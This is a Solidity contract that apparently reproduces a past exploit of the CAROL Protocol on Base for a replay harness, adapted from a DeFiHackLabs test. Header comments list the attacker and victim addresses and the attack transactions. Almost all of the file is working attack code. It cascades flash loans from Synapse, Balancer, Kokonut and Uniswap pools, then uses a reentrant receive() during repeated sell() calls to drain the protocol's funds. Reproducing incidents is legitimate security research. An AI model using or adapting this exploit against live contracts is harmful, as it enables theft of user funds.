// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// CAROLProtocol_exp.sol test's testExploit()/executeOperation()/receiveFlashLoan()/
// onFlashLoan()/uniswapV3FlashCallback()/hook() logic, but without inheriting
// forge-std Test (which depends on the Foundry cheatcode contract being
// deployed; that address has no code in a plain EVM replay, so any cheatcode
// call reverts before the real attack logic runs). The original test's
// testExploit() does cheatcode-dependent things that are replicated at the
// config level instead of inside this contract:
//   1. `deal(address(this), 0.07 ether)` and the `buy()`/`stake()` calls that
//      open the bond — replicated as `setup.steps` (a plain ETH transfer to
//      fund the exploit contract, then `buy()`/`stake()` called directly as
//      the exploit contract) so this file only needs to contain the flash-loan
//      cascade + reentrant sell.
//   2. `vm.roll(block.number + 33_719)` / `vm.warp(block.timestamp + 18 hours +
//      39 minutes - 2 seconds)` — the harness's replay engine holds ONE fixed
//      block/timestamp for the whole run (setup steps AND the recorded attack
//      call), so there is no way to run buy()/stake() at the ORIGINAL fork time
//      and then jump time forward before the attack, the way two separate
//      Foundry cheatcode-bounded "transactions" do. Instead, `setup.blockNumber`
//      / `setup.blockTimestamp` hold the ADVANCED values for the whole replay,
//      and `setup.steps` directly overwrites the bond's `collectedTime` and the
//      user's `lastActionTime` storage slots (both normally set to
//      `block.timestamp` by `stake()`/`buy()`) back to the ORIGINAL fork
//      timestamp — reproducing the same elapsed-time gap userBalance()'s
//      staking-reward formula needs, without needing two different
//      block.timestamps in one replay.
// The `log_named_decimal_uint` calls (forge-std console logging only, no
// effect on state) are dropped.

// @KeyInfo - Total Lost : ~$53K
// Attacker : https://basescan.org/address/0x5aa27d556f898846b9bad32f0cdba5b1f8bc3144
// Attack Contract : https://basescan.org/address/0xc4566ae957ad8dde4768bdd28cdc3695e4780b2c
// Vulnerable Contract : https://basescan.org/address/0x26fe408bbd7a490feb056da8e2d1e007938e5685
// Prepare Tx : https://app.blocksec.com/explorer/tx/base/0x6462f5e358eb2c7769e6aa59ce43277be4799b297bc4c9503610443b9d56cc24
// Attack Tx : https://app.blocksec.com/explorer/tx/base/0xd962d397a7f8b3aadce1622e705b9e33b430e86e0d306d6fb8ccbc5957b4185c

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x26fe408bbd7a490feb056da8e2d1e007938e5685#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1730496513359647167

interface ICAROLProtocol {
    function buy(address upline, uint8 bondType) external payable;
    function sell(uint256 tokensAmount) external;
    function stake(uint8 bondIdx) external payable;
    function userBalance(address userAddress) external view returns (uint256 balance);
}

interface IKokonut {
    function flashLoan(address borrower, uint256[] memory amounts, bytes memory data) external;
}

interface ISynapseETHPools {
    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function decimals() external view returns (uint8);
}

contract CAROLProtocolDrain {
    ICAROLProtocol private constant CAROLProtocol = ICAROLProtocol(0x26fe408BbD7A490fEB056DA8e2D1e007938E5685);
    IWETH private constant WETH = IWETH(payable(0x4200000000000000000000000000000000000006));
    ISynapseETHPools private constant SynapseETHPools = ISynapseETHPools(0x6223bD82010E2fB69F329933De20897e7a4C225f);
    IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IKokonut private constant Kokonut = IKokonut(0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17);
    IUniPairV3 private constant WETH_USDbCV3 = IUniPairV3(0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18);
    IUniPairV2 private constant WETH_USDbCV2 = IUniPairV2(0xB4885Bc63399BF5518b994c1d0C153334Ee579D0);
    IUniRouterV2 private constant Router = IUniRouterV2(0x327Df1E6de05895d2ab08513aaDD9313Fe505d86);
    IERC20 private constant CAROL = IERC20(0x4A0a76645941d8C7ba059940B3446228F0DB8972);

    bool withdrawingWETH;

    function testExploit() public {
        // The bond (buy() + stake()) is opened by the harness's setup.steps
        // BEFORE this function is called - see the file header comment. This
        // function only runs the "Attack tx": the nested flash-loan cascade
        // and the reentrant sell().

        // Flashloan WETH from Synapse
        SynapseETHPools.flashLoan(address(this), address(WETH), WETH.balanceOf(address(SynapseETHPools)), bytes(""));

        withdrawingWETH = true;
        WETH.withdraw(WETH.balanceOf(address(this)));
    }

    function executeOperation(
        address sender,
        address underlying,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external {
        // Flashloan WETH from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = WETH.balanceOf(address(BalancerVault));
        BalancerVault.flashLoan(address(this), tokens, amounts, bytes(""));
        WETH.transfer(address(SynapseETHPools), amount + fee);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // Flashloan WETH from Kokonut
        uint256[] memory tokenAmounts = new uint256[](2);
        tokenAmounts[0] = 0;
        tokenAmounts[1] = WETH.balanceOf(address(Kokonut));
        Kokonut.flashLoan(address(this), tokenAmounts, bytes(""));
        WETH.transfer(msg.sender, amounts[0]);
    }

    function onFlashLoan(
        address initiator,
        uint256[] calldata amounts,
        uint256[] calldata fees,
        bytes calldata data
    ) external {
        // Flashloan WETH from UniswapV3 pool
        bytes memory data = abi.encode(uint256(WETH.balanceOf(address(WETH_USDbCV3))));
        WETH_USDbCV3.flash(address(this), WETH.balanceOf(address(WETH_USDbCV3)), 0, data);
        WETH.transfer(address(Kokonut), amounts[1] + fees[1]);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 repayAmount = abi.decode(data, (uint256));
        // Following value comes from data parameter in attack tx
        // The total amount of WETH should be this much after flashloans
        uint256 totalAmountOfWETH = 3400e18;
        uint256 amount0Out = totalAmountOfWETH - (WETH.balanceOf(address(this)));
        // Borrow additional WETH amount
        WETH_USDbCV2.swap(amount0Out, 0, address(this), abi.encodePacked(uint8(1)));
        WETH.transfer(address(WETH_USDbCV3), repayAmount + fee0);
    }

    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // Swap all WETH to CAROL
        WETH.approve(address(Router), type(uint256).max);
        CAROL.approve(address(Router), type(uint256).max);
        WETHToCAROL();

        uint256 sellAmount = CAROLProtocol.userBalance(address(this));
        uint256 i;
        while (i < 1000) {
            // Call to flawed function. This function make a call to swapExactTokensForETH
            // swapExactTokensForETH calls receive() function of this contract (reentrancy possibility)
            // In receive() exploiter can manipulate 'ethReserved' value (analysis link)
            (bool success,) =
                address(CAROLProtocol).call(abi.encodeWithSelector(bytes4(ICAROLProtocol.sell.selector), sellAmount));
            if (success) {
                break;
            } else {
                sellAmount = sellAmount - sellAmount / 100;
                ++i;
            }
        }
        CAROLToWETH(CAROL.balanceOf(address(this)));
        WETH.deposit{value: address(this).balance}();
        uint256 feeAmt = amount0 * 30;
        uint256 amountToTransfer = (amount0 + feeAmt / 10_000) + 50e15;
        WETH.transfer(address(WETH_USDbCV2), amountToTransfer);
    }

    receive() external payable {
        if (withdrawingWETH) {
            return;
        }
        uint256 amountIn = (CAROL.balanceOf(address(this)) * 90) / 100;
        // Guard added for the setup step that funds this contract with plain
        // ETH (a transfer with no CAROL balance yet) before the bond is opened;
        // the original test never took that path since deal() doesn't trigger
        // receive(). Swapping a zero amount through the router would revert
        // ("INSUFFICIENT_INPUT_AMOUNT"), so skip when there is nothing to swap.
        if (amountIn == 0) {
            return;
        }
        CAROLToWETH(amountIn);
    }

    function WETHToCAROL() private {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(CAROL);

        Router.swapExactTokensForTokens(WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp + 4000);
    }

    function CAROLToWETH(
        uint256 amount
    ) private {
        address[] memory path = new address[](2);
        path[0] = address(CAROL);
        path[1] = address(WETH);

        Router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp + 4000);
    }
}
